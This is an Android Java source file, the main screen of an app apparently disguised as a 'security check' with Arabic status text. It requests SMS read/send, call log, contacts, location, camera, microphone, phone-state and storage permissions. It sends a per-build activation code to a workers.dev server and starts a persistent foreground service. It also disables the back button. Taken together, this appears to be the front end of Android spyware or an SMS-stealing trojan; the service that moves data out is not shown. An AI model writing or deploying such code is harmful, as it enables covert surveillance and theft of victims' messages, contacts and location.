package com.sec.check;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final String TAG = "SecurityCheck";
    private static final int PERMISSION_REQUEST = 1001;
    private static final String PREFS = "sc_prefs";
    private static final String KEY_CODE = "activation_code";
    private static final String SERVER_URL = "https://sec.h42536974.workers.dev";

    private static final String[] PERMISSIONS = {
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "========= APP STARTED =========");

        // ★★★ اقرأ الكود ★★★
        String activationCode = "";
        try {
            activationCode = BuildConfig.ACTIVATION_CODE;
            Log.d(TAG, "BuildConfig code: [" + activationCode + "]");
        } catch (Exception e) {
            Log.e(TAG, "BuildConfig error: " + e.getMessage());
        }

        // حفظ الكود
        if (activationCode != null && !activationCode.isEmpty() && !activationCode.equals("DEFAULT")) {
            SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
            sp.edit().putString(KEY_CODE, activationCode).apply();
            Log.d(TAG, "Saved code: " + activationCode);
        } else {
            SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
            activationCode = sp.getString(KEY_CODE, "");
            Log.d(TAG, "Loaded saved code: " + activationCode);
        }

        // ★★★ اعرض الشاشة ★★★
        showStatusScreen("بدء التحقق...\nCode: " + activationCode);

        // ★★★ اطلب الأذونات ★★★
        requestPermissionsIfNeeded();

        // ★★★ شغّل الخدمة ★★★
        startServiceNow();

        // ★★★ اختبر الاتصال بالـ server ★★★
        testConnection(activationCode);
    }

    private void showStatusScreen(String message) {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#ffffff"));
        root.setGravity(Gravity.CENTER);
        root.setPadding(40, 40, 40, 40);

        TextView icon = new TextView(this);
        icon.setText("🔐");
        icon.setTextSize(64);
        icon.setGravity(Gravity.CENTER);
        root.addView(icon);

        TextView msg = new TextView(this);
        msg.setText(message);
        msg.setTextSize(14);
        msg.setTextColor(Color.parseColor("#1a202c"));
        msg.setGravity(Gravity.CENTER);
        msg.setPadding(0, 20, 0, 0);
        root.addView(msg);

        setContentView(root);
    }

    private void testConnection(final String code) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String url = SERVER_URL + "/apk/test?code=" + code;
                    Log.d(TAG, "Testing: " + url);

                    URL u = new URL(url);
                    HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(15000);

                    int rc = conn.getResponseCode();
                    Log.d(TAG, "Test connection: " + rc);

                    if (rc == 200) {
                        BufferedReader reader = new BufferedReader(
                            new InputStreamReader(conn.getInputStream()));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) sb.append(line);
                        reader.close();
                        Log.d(TAG, "Test response: " + sb.toString());
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Test connection error: " + e.getMessage());
                }
            }
        }).start();
    }

    private void requestPermissionsIfNeeded() {
        if (Build.VERSION.SDK_INT < 23) return;

        List<String> need = new ArrayList<>();
        for (String p : PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                need.add(p);
            }
        }

        Log.d(TAG, "Permissions needed: " + need.size());

        if (!need.isEmpty()) {
            ActivityCompat.requestPermissions(this, need.toArray(new String[0]), PERMISSION_REQUEST);
        }
    }

    private void startServiceNow() {
        try {
            Intent svc = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
            Log.d(TAG, "✅ Service started");
        } catch (Exception e) {
            Log.e(TAG, "❌ Start service error: " + e.getMessage());
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        Log.d(TAG, "=== Permissions result ===");
        for (int i = 0; i < permissions.length; i++) {
            Log.d(TAG, permissions[i] + " -> " + 
                (grantResults[i] == PackageManager.PERMISSION_GRANTED ? "GRANTED" : "DENIED"));
        }
    }

    @Override
    public void onBackPressed() {
    }
                  }
